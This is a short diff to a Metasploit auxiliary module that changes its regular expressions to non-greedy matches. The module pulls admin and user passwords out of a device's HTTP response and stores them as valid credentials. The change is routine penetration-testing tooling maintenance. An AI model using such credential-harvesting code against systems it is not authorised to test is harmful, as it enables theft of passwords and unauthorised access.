@@ -49,16 +49,16 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
 
-      if res.body =~ /pw_adminpw = "(.+)";/
+      if res.body =~ /pw_adminpw = "(.+?)";/
         print_good("Found: admin:#{$1}")
         store_valid_credential(
           user:         'admin',
           private:      $1,
           private_type: :password
         )
-      end  
+      end
 
-      if res.body =~ /pw_userpw = "(.+)";/
+      if res.body =~ /pw_userpw = "(.+?)";/
         print_good("Found: user:#{$1}")
         store_valid_credential(
           user:         'user',
